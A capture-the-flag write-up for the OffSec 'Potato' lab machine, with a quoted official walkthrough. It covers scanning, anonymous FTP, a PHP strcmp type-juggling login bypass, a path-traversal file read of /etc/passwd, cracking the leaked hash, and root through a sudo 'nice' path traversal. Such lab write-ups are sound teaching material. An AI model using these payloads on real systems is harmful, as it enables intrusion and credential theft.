---
title: Potato
parent: Proving Grounds Play
grand_parent: Writeups
nav_order:
---
# Machine
## OS
## Level

---
# Reconnaissance
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Potato]
└─$ sudo nmap -Pn -p- -sS -oN open-port_scan.txt --open 192.168.242.101
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-30 17:41 +0900
Nmap scan report for 192.168.242.101
Host is up (0.081s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2112/tcp open  kip

Nmap done: 1 IP address (1 host up) scanned in 31.32 seconds

```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Potato]
└─$ sudo nmap -Pn -p22,80,2112 -sSCV -A -oN full_tcp-scan.txt --open 192.168.242.101
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-30 17:55 +0900
Nmap scan report for 192.168.242.101
Host is up (0.078s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ef:24:0e:ab:d2:b3:16:b4:4b:2e:27:c0:5f:48:79:8b (RSA)
|   256 f2:d8:35:3f:49:59:85:85:07:e6:a2:0e:65:7a:8c:4b (ECDSA)
|_  256 0b:23:89:c3:c0:26:d5:64:5e:93:b7:ba:f5:14:7f:3e (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Potato company
|_http-server-header: Apache/2.4.41 (Ubuntu)
2112/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
|_-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   78.54 ms 192.168.45.1
2   77.03 ms 192.168.45.254
3   78.64 ms 192.168.251.1
4   78.79 ms 192.168.242.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.74 seconds
```


# SSH
## 22

```zsh

```

```zsh

```

# HTTP

## 80

```zsh

```

```zsh

```

http://192.168.242.101/

![](../../../assets/images/Pasted%20image%2020260530181620.png)

```zsh
<html> <head><title>Potato company</title></head> <body> <h1>Potato company</h1> <p>At the moment, there is nothing. This site is under construction. To make you wait, here is a photo of a potato:</p> <img src="[potato.jpg](view-source:http://192.168.242.101/potato.jpg)"> </body> <html>
```

![](../../../assets/images/Pasted%20image%2020260530182142.png)

![](../../../assets/images/Pasted%20image%2020260530191827.png)

https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016

![](../../../assets/images/Pasted%20image%2020260530191736.png)

password[]== ''

![](../../../assets/images/Pasted%20image%2020260530191615.png)

## Open response in browser

![](../../../assets/images/Pasted%20image%2020260530192140.png)

![](../../../assets/images/Pasted%20image%2020260530192113.png)

http://192.168.157.101/admin/dashboard.php?page=log

### LFI

```zsh
POST /admin/dashboard.php?page=log HTTP/1.1
Host: 192.168.157.101
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: http://192.168.157.101
Connection: keep-alive
Referer: http://192.168.157.101/admin/dashboard.php?page=log
Cookie: pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh
Upgrade-Insecure-Requests: 1
Priority: u=0, i

file=../../../../../etc/passwd
```

![](../../../assets/images/Pasted%20image%2020260531180758.png)

webadmin

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Potato]
└─$ echo 'webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash' > webadmin_hash
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Potato]
└─$ john webadmin_hash -w /usr/share/wordlists/rockyou.txt
```

```zsh
dragon           (webadmin)     
1g 0:00:00:00 DONE (2026-05-31 18:30) 100.0g/s 153600p/s 153600c/s 153600C/s 123456..keeper
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

---
# FTP
## 2112

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Potato]
└─$ ftp 192.168.242.101 2112
Connected to 192.168.242.101.
220 ProFTPD Server (Debian) [::ffff:192.168.242.101]
Name (192.168.242.101:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230-Welcome, archive user anonymous@192.168.45.214 !
230-
230-The local time is: Sat May 30 09:18:35 2026
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||3560|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
226 Transfer complete

ftp> mget *
mget welcome.msg [anpqy?]? y
229 Entering Extended Passive Mode (|||5124|)
150 Opening BINARY mode data connection for welcome.msg (54 bytes)
    54      115.39 KiB/s 
y226 Transfer complete
54 bytes received in 00:00 (0.26 KiB/s)
mget index.php.bak [anpqy?]? y
229 Entering Extended Passive Mode (|||19711|)
150 Opening BINARY mode data connection for index.php.bak (901 bytes)
   901        9.76 MiB/s 
226 Transfer complete
901 bytes received in 00:00 (11.21 KiB/s)
ftp> exit
221 Goodbye.
```

```zsh

```

```zsh

```

---

# Initial Access

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Potato]
└─$ ssh webadmin@192.168.157.101            
The authenticity of host '192.168.157.101 (192.168.157.101)' can't be established.
ED25519 key fingerprint is: SHA256:9DQds4tRzLVKtayQC3VgIo53wDRYtKzwBRgF14XKjCg
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:37: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.157.101' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
webadmin@192.168.157.101's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 31 May 2026 09:31:51 AM UTC

  System load:  0.0                Processes:               147
  Usage of /:   12.2% of 31.37GB   Users logged in:         0
  Memory usage: 24%                IPv4 address for ens192: 192.168.157.101
  Swap usage:   0%


118 updates can be installed immediately.
33 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

webadmin@serv:~$ 
```

```zsh
webadmin@serv:~$ sudo -l
[sudo] password for webadmin: 
Matching Defaults entries for webadmin on serv:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*
```

---

# Privilege Escalation

```zsh
webadmin@serv:~$ sudo -l
Matching Defaults entries for webadmin on serv:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*
webadmin@serv:~$ ll /notes/
total 16
drwxr-xr-x  2 root root 4096 Aug  2  2020 ./
drwxr-xr-x 21 root root 4096 Sep 28  2020 ../
-rwx------  1 root root   11 Aug  2  2020 clear.sh*
-rwx------  1 root root    8 Aug  2  2020 id.sh*
webadmin@serv:~$ touch /notes/hoge.txt
touch: cannot touch '/notes/hoge.txt': Permission denied
webadmin@serv:~$ sudo /bin/nice /notes/id.sh
uid=0(root) gid=0(root) groups=0(root)
webadmin@serv:~$ getcap -r 2>/dev/null
webadmin@serv:~$ sudo /bin/nice /notes/../bin/bash
root@serv:/home/webadmin# id
uid=0(root) gid=0(root) groups=0(root)
root@serv:/home/webadmin# cat /root/proof.txt
5b205ee55722afdb83f3c6b50e43286e
root@serv:/home/webadmin# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:ab:b9:f9 brd ff:ff:ff:ff:ff:ff
    inet 192.168.157.101/24 brd 192.168.157.255 scope global ens192
       valid_lft forever preferred_lft forever

```


<details markdown="1">
<summary>Walkthrough</summary>

```zsh
Walkthrough
Close
Exploitation Guide for Potato
Summary
This machine is exploited via bypassing PHP authentication, local file inclusion vulnerability, and weak user credentials. It is escalated by abusing misconfiguration of sudo permissions.

Enumeration
Nmap
We start off by running an nmap scan against all TCP ports:

kali@kali:~$ sudo nmap -p- 192.168.120.58
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-25 08:48 EDT
Nmap scan report for 192.168.120.58
Host is up (0.038s latency).
Not shown: 1997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2112/tcp open  kip
We can further enumerate port 2112 with a more detailed scan:

kali@kali:~$ sudo nmap -p 2112 192.168.120.58 -sC -sV
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-25 08:55 EDT
Nmap scan report for 192.168.120.58
Host is up (0.030s latency).

PORT     STATE SERVICE VERSION
2112/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp           901 Aug  2 19:33 index.php.bak
|_-rw-r--r--   1 ftp      ftp            54 Aug  2 18:17 welcome.msg
We see ProFTPD running on port 2112, and the server allows for anonymous authentication. In addition, we can see two files of interest: index.php.bak and welcome.msg.

Gobuster
Navigating to port 80 (http://192.168.120.58/) doesn't show anything useful, but we can use gobuster to bruteforce the site's directories:

kali@kali:~$ gobuster dir -u http://192.168.120.58 -w /usr/share/wordlists/dirb/common.txt -z
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
...
/.hta (Status: 403)
/.htpasswd (Status: 403)
/admin (Status: 301)
/.htaccess (Status: 403)
/index.php (Status: 200)
/server-status (Status: 403)
...
This scan shows us the directory /admin. If we navigate there (http://192.168.120.58/admin/), we are greeted with a login control. Trying some easy or default passwords does not prove useful.

Exploitation
Anonymous FTP Server
Since we discovered that the ProFTPD server supports anonymous authentication and saw a couple of files hosted there, we can try retrieving them for inspection:

kali@kali:~$ ftp 192.168.120.58 2112
Connected to 192.168.120.58.
220 ProFTPD Server (Debian) [::ffff:192.168.120.58]
Name (192.168.120.58:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230-Welcome, archive user anonymous@192.168.118.3 !
...
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp           901 Aug  2 19:33 index.php.bak
-rw-r--r--   1 ftp      ftp            54 Aug  2 18:17 welcome.msg
226 Transfer complete
ftp> 
ftp> get index.php.bak
local: index.php.bak remote: index.php.bak
200 PORT command successful
150 Opening BINARY mode data connection for index.php.bak (901 bytes)
226 Transfer complete
901 bytes received in 0.00 secs (14.3210 MB/s)
ftp> 
ftp> get welcome.msg
local: welcome.msg remote: welcome.msg
200 PORT command successful
150 Opening BINARY mode data connection for welcome.msg (54 bytes)
226 Transfer complete
54 bytes received in 0.00 secs (994.9882 kB/s)
ftp> 
ftp> bye
221 Goodbye.
kali@kali:~$ 
File welcome.msg does not have anything of value to us; however, file index.php.bak does.

PHP Type Juggling and Authentication Bypass
The index backup file contains these lines of interest:

<?php

$pass= "potato"; //note Change this password regularly

if($_GET['login']==="1"){
  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
    echo "Welcome!  Go to the <a href=\"dashboard.php\">dashboard</a>";
    setcookie('pass', $pass, time() + 365*24*3600);
  }else{
    echo "<p>Bad login/password!  Return to the <a href=\"index.php\">login page</a> <p>";
  }
  exit();
}
?>
Although we notice the default password in the statement$pass= "potato";, the admin password has been changed. Of particular importance is line 10:

if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
OWASP has a very informative document that explains a possible PHP type juggling attack vector against a check like this.

In PHP, there exist two types of comparisons: strict comparisons (that use syntax ===) and loose comparisons (that use syntax ==). The differences in their evaluation matter a great deal, especially where it concerns PHP Type Juggling. Looking at the source code, we see the PHP string comparator function strcmp is used to compare the username to the string admin and the password to the variable $pass.

The function strcmp accepts two parameters, both of which must be of type string. If we play around with this function, we will notice that it really dislikes when the parameters are not strings. In particular, the function will give up and return NULL if a parameter is an array:

kali@kali:~$ php -a
Interactive mode enabled

php > $test = strcmp(array(), "password");
PHP Warning:  strcmp() expects parameter 1 to be string, array given in php shell code on line 1
php > echo $test === NULL;
1
php >
Testing this further, we see that NULL actually equals the integer 0 when using loose comparison (==) - as is the case in the backup file:

php > echo (NULL == 0);
1
php >
Had the application employed strict comparisons, this vulnerability would not exist. Because we fully control the password POST variable $_POST['password'], we are able to intercept the request and change it to an empty array. As a result, expression strcmp($_POST['password'], $pass) would evaluate to NULL and, because of the loose comparison, the check strcmp($_POST['password'], $pass) == 0 would pass, essentially bypassing authentication entirely.

Next, we will set up our web browser to use Burp proxy and intercept the login request:

POST /admin/index.php?login=1 HTTP/1.1
Host: 192.168.120.58
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.120.58/admin/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Connection: close
Upgrade-Insecure-Requests: 1

username=admin&password=test
We will change the intercepted request to the following before forwarding it to the server:

POST /admin/index.php?login=1 HTTP/1.1
...

username=admin&password[]=""
As a result, we have successfully bypassed authentication and are redirected to http://192.168.120.58/admin/index.php?login=1, where we are greeted with the following:

Welcome!
Go to the dashboard
We will follow the link and navigate to the dashboard page (http://192.168.120.58/admin/dashboard.php) where we see five additional links: Home, Users, Date, Logs, and Ping.

LFI Vulnerability
Still using Burp proxy, we will investigate these pages while observing requests sent to the server. The Logs page (http://192.168.120.58/admin/dashboard.php?page=log) functionality should catch our attention. We see three log files listed here: log_01.txt, log_02.txt, and log_03.txt. If we select one of these logs and click Get the log button, the POST request would look like this:

POST /admin/dashboard.php?page=log HTTP/1.1
...

file=log_01.txt
We observe the file POST parameter in the request, and it hints at the possibility of a local file inclusion vulnerability. Swapping the intercepted POST data with file=../../../../../etc/passwd confirms this, and we get the contents of /etc/passwd:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
ftp:x:113:65534::/srv/ftp:/usr/sbin/nologin
webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
Password Cracking
We will attempt to crack the recovered password hash for user webadmin with john and the default wordlist:

kali@kali:~$ cat pass.txt 
webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
kali@kali:~$ 
kali@kali:~$ john pass.txt
...
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
dragon           (webadmin)
1g 0:00:00:00 DONE 2/3 (2020-09-25 10:08) 33.33g/s 35933p/s 35933c/s 35933C/s 123456..knight
...
The password cracker comes back with the password dragon.

SSH
We can now SSH into the machine with credentials webadmin:dragon:

kali@kali:~$ ssh webadmin@192.168.120.58
webadmin@192.168.120.58's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)
...
webadmin@serv:~$ id
uid=1001(webadmin) gid=1001(webadmin) groups=1001(webadmin)
webadmin@serv:~$
Escalation
Sudo Enumeration
Checking our sudo permissions shows that we are able to run all files in the /notes directory using /bin/nice:

webadmin@serv:~$ sudo -l
[sudo] password for webadmin: 
Matching Defaults entries for webadmin on serv:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*
webadmin@serv:~$
Checking permissions on /notes, we are unable to write to that directory:

webadmin@serv:~$ ls -lah /notes/
total 16K
drwxr-xr-x  2 root root 4.0K Aug  2 19:11 .
drwxr-xr-x 21 root root 4.0K Sep 20 16:18 ..
-rwx------  1 root root   11 Aug  2 19:11 clear.sh
-rwx------  1 root root    8 Aug  2 19:11 id.sh
webadmin@serv:~$
However, we can use a directory traversal trick to bypass this restriction. First, create a file in the home directory that we would like to run and give it executable permissions:

webadmin@serv:~$ pwd
/home/webadmin
webadmin@serv:~$ echo "/bin/bash" > pwn.sh
webadmin@serv:~$ cat pwn.sh 
/bin/bash
webadmin@serv:~$ chmod +x pwn.sh
webadmin@serv:~$
We can now use the following path to our file, bypassing the directory write restriction and granting us a root shell:

webadmin@serv:~$ whoami
webadmin
webadmin@serv:~$ sudo /bin/nice /notes/../home/webadmin/pwn.sh 
root@serv:/home/webadmin# id
uid=0(root) gid=0(root) groups=0(root)
root@serv:/home/webadmin#
```

</details>